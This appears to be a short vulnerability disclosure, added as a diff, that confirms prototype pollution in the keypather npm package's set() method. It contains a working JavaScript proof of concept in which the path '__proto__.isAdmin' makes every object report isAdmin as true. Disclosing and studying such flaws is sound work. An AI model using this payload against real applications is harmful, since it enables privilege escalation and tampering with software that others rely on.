@@ -1,0 +1,16 @@
+Confirmed prototype pollution via `Keypather.prototype.set`.
+
+```javascript
+const keypather = require("keypather")();
+
+const victim = {};
+console.log("Before attack, victim.isAdmin:", victim.isAdmin);
+
+// Prototype pollution: keypather's set() splits the keypath on '.'
+// without filtering dangerous segments like '__proto__', letting an
+// attacker-controlled path reach Object.prototype.
+keypather.set({}, "__proto__.isAdmin", true);
+
+console.log("After attack, victim.isAdmin:", victim.isAdmin); // true - polluted!
+console.log("After attack, {}.isAdmin:", ({}).isAdmin); // true - all objects affected
+```
